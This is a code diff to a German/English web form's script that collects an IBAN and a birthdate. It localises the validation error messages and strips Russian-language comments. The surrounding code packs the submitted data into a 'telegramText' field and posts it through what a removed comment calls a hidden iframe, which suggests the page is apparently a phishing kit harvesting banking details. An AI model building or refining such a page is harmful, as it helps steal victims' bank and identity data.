@@ -368,10 +368,17 @@
               else el.textContent = text;
             }
           });
+          const birthErr = document.getElementById('birthdateError');
+          const ibanErr = document.getElementById('ibanError');
+          if (birthErr && birthErr.style.display === 'block') {
+            birthErr.textContent = lang === 'en' ? 'Invalid date.' : 'Ungültiges Datum.';
+          }
+          if (ibanErr && ibanErr.style.display === 'block') {
+            ibanErr.textContent = lang === 'en' ? 'Invalid IBAN.' : 'Ungültige IBAN.';
+          }
         });
       });
 
-      // Валидация IBAN
       const ibanInput = document.getElementById('iban');
       if (ibanInput) {
         ibanInput.addEventListener('input', function() {
@@ -381,7 +388,6 @@
         });
       }
 
-      // Валидация даты рождения
       function validateBirthdate(value) {
         const parts = value.split('/');
         if (parts.length !== 3) return { valid: false, message: 'Ungültiges Datum.' };
@@ -402,6 +408,7 @@
       form.addEventListener('submit', (e) => {
         e.preventDefault();
 
+        const lang = document.querySelector('.lang-btn.is-active').getAttribute('data-lang');
         const ibanErr = document.getElementById('ibanError');
         const birthErr = document.getElementById('birthdateError');
         if (ibanErr) ibanErr.style.display = 'none';
@@ -409,14 +416,20 @@
 
         const iban = document.getElementById('iban').value.trim();
         if (iban.length < 20) {
-          if (ibanErr) { ibanErr.textContent = 'Ungültige IBAN.'; ibanErr.style.display = 'block'; }
+          if (ibanErr) {
+            ibanErr.textContent = lang === 'en' ? 'Invalid IBAN.' : 'Ungültige IBAN.';
+            ibanErr.style.display = 'block';
+          }
           return;
         }
 
         const geburtsdatum = document.getElementById('geburtsdatum').value.trim();
         const birthdateValidation = validateBirthdate(geburtsdatum);
         if (!birthdateValidation.valid) {
-          if (birthErr) { birthErr.textContent = birthdateValidation.message; birthErr.style.display = 'block'; }
+          if (birthErr) {
+            birthErr.textContent = lang === 'en' ? 'Invalid date.' : birthdateValidation.message;
+            birthErr.style.display = 'block';
+          }
           return;
         }
 
@@ -446,7 +459,6 @@
 
         document.getElementById('telegramText').value = message;
         
-        // Отправка формы в скрытый iframe
         const formData = new FormData(form);
         fetch(form.action, {
           method: 'POST',
